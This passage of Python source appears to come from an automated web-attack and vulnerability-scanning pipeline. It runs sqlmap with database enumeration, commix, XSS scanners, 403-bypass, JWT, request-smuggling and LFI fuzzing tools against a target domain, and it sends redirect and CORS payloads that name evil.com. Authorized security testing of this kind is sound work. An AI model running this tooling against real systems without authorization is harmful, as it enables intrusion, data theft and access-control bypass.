    findings["prototype_pollution"] = test_prototype_pollution(live_urls, params, rl)

    # ── HTTP Request Smuggling ────────────────────────────────────────────────
    log.info("Testing for HTTP request smuggling...")
    findings["http_smuggling"] = test_http_smuggling(live_urls, rl)
    if findings["http_smuggling"]:
        log.warning(f"HTTP smuggling indicators: {len(findings['http_smuggling'])}")

    # ── Cache Poisoning ───────────────────────────────────────────────────────
    log.info("Testing for cache poisoning...")
    findings["cache_poisoning"] = test_cache_poisoning(live_urls, rl)
    if findings["cache_poisoning"]:
        log.warning(f"Cache poisoning: {len(findings['cache_poisoning'])} findings")

    # ── CORS Advanced ─────────────────────────────────────────────────────────
    log.info("Testing CORS misconfigurations...")
    findings["cors"] = test_cors_advanced(live_urls, domain, rl)
    if findings["cors"]:
        log.warning(f"CORS: {len(findings['cors'])} findings")

    # ── Open Redirect ─────────────────────────────────────────────────────────
    log.info("Testing for open redirects...")
    redir_params = [p for p in params if any(k in p.lower() for k in
                    ["redirect", "url", "next", "dest", "goto", "return",
                     "target", "redir", "location", "back", "forward", "to"])]
    for url in live_urls[:15]:
        for param in redir_params[:10]:
            for payload in REDIRECT_PAYLOADS:
                sep  = "&" if "?" in url else "?"
                rurl = f"{url}{sep}{param}={urllib.parse.quote(payload)}"
                resp = _safe_get(rurl, timeout=8, allow_redirects=True)
                if resp and "evil.com" in str(resp.url):
                    findings["open_redirect"].append({
                        "url": rurl, "param": param, "payload": payload,
                        "type": "Open Redirect", "severity": "Medium",
                        "final_url": str(resp.url),
                    })
                    log.warning(f"Open Redirect: {rurl[:80]}")
                rl.wait()

    # ── CRLF Injection ────────────────────────────────────────────────────────
    log.info("Testing CRLF injection...")
    findings["crlf_injection"] = test_crlf(live_urls, params, rl)

    # ── OAuth Misconfig ────────────────────────────────────────────────────────
    log.info("Testing OAuth misconfigurations...")
    findings["oauth"] = test_oauth_misconfig(live_urls, domain, rl)

    # ── 403 Bypass ────────────────────────────────────────────────────────────
    log.info("Testing 403 bypass techniques...")
    forbidden_urls = [
        h["url"] for h in prev.get("live_hosts", [])
        if h.get("status") in [403, 401]
    ]
    forbidden_urls += [
        f"https://{domain}/admin",
        f"https://{domain}/wp-admin",
        f"https://{domain}/.env",
        f"https://{domain}/internal",
        f"https://{domain}/api/admin",
    ]
    findings["bypass_403"] = test_403_bypass(forbidden_urls, rl)
    if findings["bypass_403"]:
        log.warning(f"403 bypassed: {len(findings['bypass_403'])} findings!")
        findings["critical_count"] += len(findings["bypass_403"])

    # ── Clickjacking ──────────────────────────────────────────────────────────
    log.info("Testing clickjacking vulnerability...")
    findings["clickjacking"] = test_clickjacking(live_urls, rl)

    # ── sqlmap (automated SQL injection) ──────────────────────────────────────
    if require_tool("sqlmap") and param_urls:
        log.info("Running sqlmap on parameterized URLs...")
        sqlmap_targets = phase_dir / "sqlmap_targets.txt"
        write_lines(sqlmap_targets, param_urls[:50])
        sqli_wl = output_dir.parent.parent / "wordlists" / "sqli_payloads.txt"

        sqlmap_out_dir = phase_dir / "sqlmap"
        sqlmap_out_dir.mkdir(exist_ok=True)
        rc, stdout, stderr = run(
            f"sqlmap --batch --level 3 --risk 2 --threads {min(cfg.threads, 10)} "
            f"--output-dir {sqlmap_out_dir} "
            f"-m {sqlmap_targets} "
            f"--form --dbs --random-agent --timeout 30 "
            f"--answers='quit=N,crack=N' --no-logging",
            timeout=1800, silent=True,
        )
        # Parse sqlmap output for injections found
        for line in stdout.splitlines():
            if "is vulnerable" in line.lower() or "parameter" in line.lower() and "injectable" in line.lower():
                findings["sqli"].append({
                    "type": "SQLi (sqlmap confirmed)",
                    "evidence": line.strip()[:200],
                    "severity": "Critical",
                    "tool": "sqlmap",
                })
                findings["critical_count"] += 1
                log.warning(f"sqlmap: {line.strip()[:80]}")
        log.success(f"sqlmap done — {len([f for f in findings['sqli'] if f.get('tool') == 'sqlmap'])} confirmed injections")

    # ── dalfox (XSS scanner) ──────────────────────────────────────────────────
    if require_tool("dalfox") and param_urls:
        log.info("Running dalfox (Advanced XSS scanner)...")
        dalfox_in  = phase_dir / "dalfox_input.txt"
        dalfox_out = phase_dir / "dalfox_results.txt"
        write_lines(dalfox_in, param_urls[:100])
        xss_wl = output_dir.parent.parent / "wordlists" / "xss_payloads.txt"
        run(
            f"dalfox file {dalfox_in} "
            f"--silence --no-color -w {min(cfg.threads, 20)} "
            f"--timeout 10 --skip-bav "
            f"-o {dalfox_out}",
            timeout=900,
        )
        if dalfox_out.exists():
            for line in read_lines(dalfox_out):
                if "[VULN]" in line or "xss" in line.lower():
                    findings["xss"].append({
                        "evidence": line.strip()[:200],
                        "type": "XSS (dalfox)",
                        "severity": "High",
                        "tool": "dalfox",
                    })
            dalfox_count = len([f for f in findings["xss"] if f.get("tool") == "dalfox"])
            if dalfox_count:
                log.warning(f"dalfox: {dalfox_count} XSS found!")

    # ── XSStrike ──────────────────────────────────────────────────────────────
    if require_tool("xsstrike") and live_urls:
        log.info("Running XSStrike on live URLs...")
        for url in live_urls[:10]:
            if "?" in url:
                xss_out = phase_dir / "xsstrike_out.txt"
                rc, stdout, _ = run(
                    f"python3 /opt/xsstrike/xsstrike.py -u '{url}' "
                    f"--crawl --blind --skip --timeout 10 2>&1 | head -100",
                    timeout=120, shell=True, silent=True
                )
                if "xss" in stdout.lower() or "vulnerable" in stdout.lower():
                    findings["xss"].append({
                        "url": url, "type": "XSS (XSStrike)",
                        "evidence": stdout[:200], "tool": "xsstrike"
                    })

    # ── commix (Command Injection) ─────────────────────────────────────────────
    if require_tool("commix") and param_urls:
        log.info("Running commix (command injection)...")
        for url in param_urls[:20]:
            rc, stdout, _ = run(
                f"commix --url='{url}' --batch --level 2 "
                f"--timeout 15 --random-agent 2>&1 | head -50",
                timeout=120, shell=True, silent=True,
            )
            if "vulnerable" in stdout.lower() or "command injection" in stdout.lower():
                findings.setdefault("command_injection", []).append({
                    "url": url, "type": "Command Injection (commix)",
                    "evidence": stdout[:200], "severity": "Critical",
                })
                findings["critical_count"] += 1
                log.warning(f"commix: Command injection at {url[:80]}")

    # ── nikto (web scanner) ────────────────────────────────────────────────────
    if require_tool("nikto"):
        log.info("Running nikto on all live URLs...")
        nikto_results = []
        for url in live_urls[:10]:
            nikto_out = phase_dir / f"nikto_{hash(url) % 10000}.txt"
            run(
                f"nikto -h {url} -Format txt -output {nikto_out} "
                f"-timeout 10 -no404 -Tuning x2468 -maxtime 3m 2>/dev/null",
                timeout=200,
            )
            if nikto_out.exists():
                for line in read_lines(nikto_out):
                    if "+ " in line and ("OSVDB" in line or "vuln" in line.lower()
                                          or "injection" in line.lower()):
                        nikto_results.append({"url": url, "finding": line.strip()})
        findings["nikto"] = nikto_results
        if nikto_results:
            log.success(f"nikto: {len(nikto_results)} findings")

    # ── crlfuzz (CRLF injection with wordlist) ────────────────────────────────
    if require_tool("crlfuzz"):
        log.info("Running crlfuzz...")
        crlfuzz_out = phase_dir / "crlfuzz_results.txt"
        for url in live_urls[:20]:
            rc, stdout, _ = run(
                f"crlfuzz -u '{url}' -s 2>/dev/null", timeout=60, silent=True)
            if stdout.strip():
                for line in stdout.splitlines():
                    if "VULN" in line.upper() or "inject" in line.lower():
                        findings["crlf_injection"].append({
                            "url": url, "evidence": line.strip(),
                            "type": "CRLF (crlfuzz)", "tool": "crlfuzz"
                        })

    # ── nomore403 (403/401 bypass) ─────────────────────────────────────────────
    if require_tool("nomore403"):
        log.info("Running nomore403 on forbidden URLs...")
        forbidden_urls_403 = [
            url for url in findings.get("bypass_403", [])
        ] if not findings.get("bypass_403") else []
        forbidden_urls_403 += [
            f"https://{domain}/admin", f"https://{domain}/api/admin",
            f"https://{domain}/.env", f"https://{domain}/wp-admin",
        ]
        for url in forbidden_urls_403[:20]:
            rc, stdout, _ = run(
                f"nomore403 -u '{url}' 2>/dev/null", timeout=60, silent=True)
            for line in stdout.splitlines():
                if "200" in line or "bypass" in line.lower():
                    findings["bypass_403"].append({
                        "url": url, "evidence": line.strip(),
                        "type": "403 Bypass (nomore403)", "tool": "nomore403"
                    })

    # ── jwt_tool (JWT attacks) ─────────────────────────────────────────────────
    if require_tool("jwt_tool") and findings.get("jwt"):
        log.info("Running jwt_tool for deep JWT testing...")
        for jwt_finding in findings["jwt"][:5]:
            token = jwt_finding.get("forged_token", "")
            if not token:
                continue
            rc, stdout, _ = run(
                f"python3 /opt/jwt_tool/jwt_tool.py '{token}' -T -t https://{domain} "
                f"--no-banner 2>/dev/null | head -30",
                timeout=60, shell=True, silent=True
            )
            if stdout and ("vuln" in stdout.lower() or "cracked" in stdout.lower()):
                jwt_finding["jwt_tool_output"] = stdout[:300]
                jwt_finding["confirmed"] = True
                log.warning(f"jwt_tool: JWT vulnerability confirmed!")

    # ── smuggler.py (HTTP request smuggling) ──────────────────────────────────
    if require_tool("smuggler"):
        log.info("Running smuggler.py (HTTP request smuggling)...")
        smug_out = phase_dir / "smuggler_results.txt"
        for url in live_urls[:10]:
            rc, stdout, _ = run(
                f"python3 /opt/smuggler/smuggler.py -u '{url}' "
                f"--timeout 10 --no-color 2>/dev/null | head -30",
                timeout=90, shell=True, silent=True
            )
            for line in stdout.splitlines():
                if "vulnerable" in line.lower() or "confirm" in line.lower():
                    findings["http_smuggling"].append({
                        "url": url, "type": "HTTP Smuggling (smuggler.py)",
                        "evidence": line.strip(), "severity": "High",
                        "tool": "smuggler"
                    })

    # ── graphw00f (GraphQL engine fingerprinting) ──────────────────────────────
    if require_tool("graphw00f"):
        log.info("Running graphw00f (GraphQL engine detection)...")
        for url in live_urls[:15]:
            for path in ["/graphql", "/api/graphql", "/gql"]:
                target = url.rstrip("/") + path
                rc, stdout, _ = run(
                    f"graphw00f -d -t {target} 2>/dev/null", timeout=30, silent=True)
                if stdout and "graphql" in stdout.lower():
                    findings["graphql"].append({
                        "url": target, "type": "GraphQL Engine Detected",
                        "engine": stdout[:200], "tool": "graphw00f"
                    })

    # ── corsy (CORS misconfiguration) ──────────────────────────────────────────
    if require_tool("corsy") or True:  # built-in Python fallback
        log.info("Running corsy (CORS scanner)...")
        targets_file = phase_dir / "corsy_targets.txt"
        write_lines(targets_file, live_urls[:100])
        if require_tool("corsy"):
            rc, stdout, _ = run(
                f"python3 -m corsy -i {targets_file} -t {min(cfg.threads, 10)} "
                f"--headers 'Origin: https://evil.com' 2>/dev/null",
                timeout=300, silent=True
            )
            for line in stdout.splitlines():
                if "misconfigured" in line.lower() or "vulnerable" in line.lower():
                    findings["cors"].append({
                        "evidence": line.strip(),
                        "type": "CORS (corsy)", "tool": "corsy"
                    })

    # ── wafw00f (WAF detection) ────────────────────────────────────────────────
    if require_tool("wafw00f"):
        log.info("Running wafw00f (WAF detection)...")
        waf_results = []
        for url in live_urls[:10]:
            rc, stdout, _ = run(
                f"wafw00f {url} 2>/dev/null | tail -5", timeout=30, silent=True)
            for line in stdout.splitlines():
                if "is behind" in line.lower() or "no waf" in line.lower():
                    waf_results.append({"url": url, "waf": line.strip()})
                    log.info(f"WAF: {line.strip()}")
        findings["waf_detection"] = waf_results

    # ── wfuzz (generic fuzzing against all params) ────────────────────────────
    if require_tool("wfuzz") and param_urls:
        log.info("Running wfuzz (generic fuzzing)...")
        lfi_wl = output_dir.parent.parent / "wordlists" / "lfi_payloads.txt"
        import os
        if not lfi_wl.exists():
            lfi_wl = Path(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))) / "wordlists" / "lfi_payloads.txt"

        if lfi_wl.exists():
            for url in param_urls[:10]:
                base_url = url.split("?")[0]
                parsed_q = urllib.parse.urlparse(url).query
                params_in_url = urllib.parse.parse_qs(parsed_q)
                if not params_in_url:
                    continue
                first_param = list(params_in_url.keys())[0]
                fuzz_url = f"{base_url}?{first_param}=FUZZ"
                wfuzz_out = phase_dir / "wfuzz_lfi.txt"
                rc, stdout, _ = run(
                    f"wfuzz -c -z file,{lfi_wl} "
                    f"--hc 404 --hw 0 -t 20 "
                    f"--timeout 10 -s 0.1 "
                    f"'{fuzz_url}' 2>/dev/null | head -30",
                    timeout=120, shell=True, silent=True
                )
                for line in stdout.splitlines():
                    if "200" in line or "000" not in line:
                        parts = line.split()
                        if len(parts) > 3:
                            findings["lfi"].append({
                                "url": fuzz_url, "param": first_param,
                                "payload": parts[-1] if parts else "?",
                                "type": "LFI (wfuzz)", "line": line.strip(),
                            })

    # ── Finalize ───────────────────────────────────────────────────────────────
    total = (
        len(findings["nuclei"]) + len(findings["xss"]) + len(findings["sqli"]) +
        len(findings["ssrf"]) + len(findings["ssti"]) + len(findings["lfi"]) +
        len(findings["xxe"]) + len(findings["jwt"]) + len(findings["graphql"]) +
        len(findings["nosql_injection"]) + len(findings["prototype_pollution"]) +
        len(findings["http_smuggling"]) + len(findings["cache_poisoning"]) +
        len(findings["cors"]) + len(findings["open_redirect"]) +
        len(findings["crlf_injection"]) + len(findings["oauth"]) +
        len(findings["bypass_403"]) + len(findings["clickjacking"]) +
        len(findings["header_injection"])
    )
    findings["total_vulns"] = total

    save_json(phase_dir / "phase_08_results.json", findings)

    # Write critical summary
    critical_summary = []
    for cat in ["sqli", "ssti", "lfi", "xxe", "ssrf", "bypass_403"]:
        for v in findings[cat]:
            critical_summary.append(f"[{cat.upper()}] {v.get('url', '')[:80]}")
    if critical_summary:
        write_lines(phase_dir / "CRITICAL_FINDINGS.txt", critical_summary)

    log.success(
        f"Phase 08 complete — {total} total findings · "
        f"{findings['critical_count']} critical · "
        f"{len(findings['nuclei'])} nuclei hits"
    )
    return findings
